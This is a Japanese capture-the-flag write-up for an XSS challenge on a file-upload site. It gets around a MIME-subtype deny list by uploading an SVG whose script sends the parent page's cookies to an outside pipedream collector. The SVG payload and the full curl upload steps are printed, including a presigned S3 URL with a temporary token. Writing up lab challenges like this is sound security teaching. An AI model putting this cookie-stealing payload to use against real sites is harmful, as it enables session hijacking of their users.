# frame:Advanced:200pts

- [Target](https://d2oljgvg90kjh.cloudfront.net/)  

**source code**  

- [Web Application](https://drive.google.com/file/d/1zVZ4NAug2bjTH-s_Kw08Qpq8xazp_QB_/view?usp=drive_link)  

※ If no announcement is made, all "Crawler" source codes are the same. (scenario1)  

[https://d2oljgvg90kjh.cloudfront.net/](https://d2oljgvg90kjh.cloudfront.net/)  

# Solution
URLとアプリケーションのソースが渡される。  
クローラは[Server Side Upload](../Server_Side_Upload)と同様なようだ。  
アクセスするとファイルアップロードサイトのようだが、いくつかの画像閲覧機能がある。  
![site.png](site/site.png)  
試しに一つ目の画像を見るとURLは`https://d2oljgvg90kjh.cloudfront.net/viewer/assets/azara.png`で、以下の通りだった。  
![image1.png](site/image1.png)  
ページのソースを見るとiframeで以下のようにblobとして埋め込まれていた。  
```html
~~~
<iframe src="blob:https://d2oljgvg90kjh.cloudfront.net/f71713ff-f103-4310-9dc0-d778cfbfdb32" style="width: 100%; height: 100%"></iframe>
~~~
```
アプリケーションのソースを見ると主要箇所は以下の通りであった。  
```ts
~~~
server.get('/viewer/*', async (request, reply) => {
  return reply.sendFile('viewer.html');
});

server.post<{
  Body: {
    contentType: string;
    length: number;
  };
}>('/api/upload', async (request, reply) => {
  if (!request.body.contentType || !request.body.length) {
    return reply.code(400).send({ error: 'No file uploaded' });
  }

  if (request.body.length > 1024 * 1024 * 100) {
    return reply.code(400).send({ error: 'File too large' });
  }

  const filename = uuidv4();
  const s3 = new S3Client({});
  const command = new PutObjectCommand({
    Bucket: process.env.BUCKET_NAME,
    Key: `upload/${filename}`,
    ContentLength: request.body.length,
    ContentType: request.body.contentType,
    ContentDisposition: 'attachment',
  });

  const url = await getSignedUrl(s3, command, {
    expiresIn: 60 * 60 * 24,
    signableHeaders: new Set(['content-type', 'content-disposition']),
  });
  return reply.header('content-type', 'application/json').send({
    url,
    filename,
  });
});
~~~
```
アップロードできる`contentType`に制限はないが、`ContentDisposition: 'attachment'`が設定されているため`text/html`でHTMLページ自体をアップロードしてのXSSは難しい。  
`viewer.html`は以下の通りであった。  
```html
<!doctype html>
<html>
  <head>
    <title>XS3 - scenario Advanced 1 - File Viewer</title>
    <script>
      const denyMimeSubTypes = ['html', 'javascript', 'xml', 'json', 'svg', 'xhtml', 'xsl'];

      const extractMimeType = (contentTypeAndParams) => {
        const [contentType, ...params] = contentTypeAndParams.split(';');
        console.log(`Extracting content type: ${contentType}`);
        console.log(`Extracting params: ${JSON.stringify(params)}`);
        const [type, subtype] = contentType.split('/');
        console.log(`Extracting type: ${type}`);
        console.log(`Extracting subtype: ${subtype}`);
        return { type, subtype, params };
      };

      const isDenyMimeSubType = (contentType) => {
        console.log(`Checking content type: ${contentType}`);
        const { subtype } = extractMimeType(contentType);
        return denyMimeSubTypes.includes(subtype.trim().toLowerCase());
      };

      window.onload = async () => {
        const url = new URL(window.location.href);
        const path = url.pathname.slice(1).split('/');
        path.shift();
        const key = path.join('/');
        console.log(`Loading file: /${key}`);

        const response = await fetch(`/${key}`);
        if (!response.ok) {
          console.error(`Failed to load file: /${key}`);
          document.body.innerHTML = '<h1>Failed to load file</h1>';
          return;
        }
        const contentType = response.headers.get('content-type');
        if (isDenyMimeSubType(contentType)) {
          console.error(`Failed to load file: /${key}`);
          document.body.innerHTML = '<h1>Failed to load file due to invalid content type</h1>';
          return;
        }
        const blobUrl = URL.createObjectURL(await response.blob());
        document.body.innerHTML = `<iframe src="${blobUrl}" style="width: 100%; height: 100%"></iframe>`;
      };
    </script>
  </head>
  <body></body>
</html>
```
`subtype`が`['html', 'javascript', 'xml', 'json', 'svg', 'xhtml', 'xsl']`でなければblobとしてiframeに設定している。  
何とかiframeでXSSできないかと考えていると、`image/svg+xml`で可能であったことを思い出す。  
これは`subtype`のチェックも通る。  
あとは`document.cookie`を読みだして外部へ送信すればいい。  
ところが、Firefoxでは順調にCookieの取得ができたが、クローラの`puppeteer`が用いるChromeでは取得できない。  
同一ドメインにSVGをアップローで可能なので、iframeの親の`parent.document.cookie`を送信すればよい。  
以下のようなSVGを用いる。  
```svg
<svg xmlns="http://www.w3.org/2000/svg">
    <script>
        fetch("https://enmz6ozs7du1q.x.pipedream.net/?satoki="+parent.document.cookie);
    </script>
</svg>
```
以下のとおり行う。  
```bash
$ curl -X POST -H 'Content-Type: application/json' -d '{"contentType":"image/svg+xml","length":166}' --upload-file xs3_parent.svg 'https://d2oljgvg90kjh.cloudfront.net/api/upload'
{"url":"https://uploadbucket-5b1bc63390-adv1-upload.s3.ap-northeast-1.amazonaws.com/upload/717e1cea-24d5-4367-bf9d-a91fa2207ba9?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAUPVKPCT4COWUMYXG%2F20240329%2Fap-northeast-1%2Fs3%2Faws4_request&X-Amz-Date=20240329T075735Z&X-Amz-Expires=86400&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEND%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaDmFwLW5vcnRoZWFzdC0xIkYwRAIgeqMZW%2Fk69yTbQkBwriJXmw55Su2NkyOOKEHG%2FD7q8WQCIHjV6lhPNtQOf7rWy80CXqFpR80tEdWfsD%2FlwLaOrdmGKq0DCOn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQARoMMzA4NTIxNDA3NzM2IgxjQ%2Fqx1AEV5sGdMscqgQM4HL9OTusIg4JOopA964z%2FNNsZg6cOfdlt%2BcRztX5RPPjknnC1mgEAEjRbu4ujLrx%2Bw%2BkXz%2B%2Ba89qMW%2B3x8pWIbAGtbB3iU1JVAzhv%2BRNSl0jG4SBIb%2FX%2Be0Vkq2mFA%2BlrTndw7Zmu0xLNZYuT6SL1BEbQx7sZkIfDr6DmjGLx9YAUqsWJc7HMLhT%2FKCM0c6kuC9qns8bF4KOAB1xegUaeZ%2BY6MRXmanrG%2FIkogzktj4WpgbtXJ5pufSPcVGaOYraKTRyra7PrXqgtEVJcwKdVjkJlaDJI3V9sBArQZZdvAb296hbeVoh207Ep%2FSR6HGUAHHSxiNnoDwjyE9BqAIP47dQS%2Bp%2BQiO2IV%2FAAbNIAa9ZGaCzMI3Hrl%2F4qs9FT4YunYY%2BkHw7AXTtX543hXO2v49tWFThpC7ejIuxUS0YvCBl7ii6m97m0wAbWoZ1D8zk1xxFUQEFnRf22kviySGZBsTV5IlL6FluVax3MYBxuxvdV%2FCNXjBAUFPv3CKEYBJMwMN%2FlmbAGOp4B7H8RM8pfXadst%2F9nFYetYXb3U6auFzodYqR7K3D%2FoE6kXuzf5W5w33BnnyCvgQcG7Nc3ZfWk3l31RcVHRguIsy79BkriqIoqyXa4zMxavXtrDR3LpBBT8hv0zjTkTDwW9b7cqjNTR5f9%2BV6QnwLYk4tlWQkZzqfMsOWQwC0yqiPDvwwT0OR8eSFZi9KUdxacvAMKiaNQlmQSEChvUpQ%3D&X-Amz-Signature=c0acb6067170c80aa179e9f1ca0ca542f9c1f0d519aa6ca6ba5177021076cca4&X-Amz-SignedHeaders=content-disposition%3Bcontent-length%3Bcontent-type%3Bhost&x-id=PutObject","filename":"717e1cea-24d5-4367-bf9d-a91fa2207ba9"}
$ curl -X PUT -H 'Content-Type: image/svg+xml' -H 'Content-Disposition: attachment' --upload-file xs3_parent.svg 'https://uploadbucket-5b1bc63390-adv1-upload.s3.ap-northeast-1.amazonaws.com/upload/717e1cea-24d5-4367-bf9d-a91fa2207ba9?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAUPVKPCT4COWUMYXG%2F20240329%2Fap-northeast-1%2Fs3%2Faws4_request&X-Amz-Date=20240329T075735Z&X-Amz-Expires=86400&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEND%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaDmFwLW5vcnRoZWFzdC0xIkYwRAIgeqMZW%2Fk69yTbQkBwriJXmw55Su2NkyOOKEHG%2FD7q8WQCIHjV6lhPNtQOf7rWy80CXqFpR80tEdWfsD%2FlwLaOrdmGKq0DCOn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQARoMMzA4NTIxNDA3NzM2IgxjQ%2Fqx1AEV5sGdMscqgQM4HL9OTusIg4JOopA964z%2FNNsZg6cOfdlt%2BcRztX5RPPjknnC1mgEAEjRbu4ujLrx%2Bw%2BkXz%2B%2Ba89qMW%2B3x8pWIbAGtbB3iU1JVAzhv%2BRNSl0jG4SBIb%2FX%2Be0Vkq2mFA%2BlrTndw7Zmu0xLNZYuT6SL1BEbQx7sZkIfDr6DmjGLx9YAUqsWJc7HMLhT%2FKCM0c6kuC9qns8bF4KOAB1xegUaeZ%2BY6MRXmanrG%2FIkogzktj4WpgbtXJ5pufSPcVGaOYraKTRyra7PrXqgtEVJcwKdVjkJlaDJI3V9sBArQZZdvAb296hbeVoh207Ep%2FSR6HGUAHHSxiNnoDwjyE9BqAIP47dQS%2Bp%2BQiO2IV%2FAAbNIAa9ZGaCzMI3Hrl%2F4qs9FT4YunYY%2BkHw7AXTtX543hXO2v49tWFThpC7ejIuxUS0YvCBl7ii6m97m0wAbWoZ1D8zk1xxFUQEFnRf22kviySGZBsTV5IlL6FluVax3MYBxuxvdV%2FCNXjBAUFPv3CKEYBJMwMN%2FlmbAGOp4B7H8RM8pfXadst%2F9nFYetYXb3U6auFzodYqR7K3D%2FoE6kXuzf5W5w33BnnyCvgQcG7Nc3ZfWk3l31RcVHRguIsy79BkriqIoqyXa4zMxavXtrDR3LpBBT8hv0zjTkTDwW9b7cqjNTR5f9%2BV6QnwLYk4tlWQkZzqfMsOWQwC0yqiPDvwwT0OR8eSFZi9KUdxacvAMKiaNQlmQSEChvUpQ%3D&X-Amz-Signature=c0acb6067170c80aa179e9f1ca0ca542f9c1f0d519aa6ca6ba5177021076cca4&X-Amz-SignedHeaders=content-disposition%3Bcontent-length%3Bcontent-type%3Bhost&x-id=PutObject'
$ curl https://d2oljgvg90kjh.cloudfront.net/upload/717e1cea-24d5-4367-bf9d-a91fa2207ba9
<svg xmlns="http://www.w3.org/2000/svg">
    <script>
        fetch("https://enmz6ozs7du1q.x.pipedream.net/?satoki="+parent.document.cookie);
    </script>
</svg>
```
アップロードに成功したら`https://d2oljgvg90kjh.cloudfront.net/viewer/upload/717e1cea-24d5-4367-bf9d-a91fa2207ba9`にアクセスすると、iframe経由で無事XSSが発生した。  
これをクローラへ投げると以下のリクエストが到着する。  
```
GET
/?satoki=flag=flag{d41d8cd98f00b204e9800998ecf8427e}
```
flagが得られた。  

## flag{d41d8cd98f00b204e9800998ecf8427e}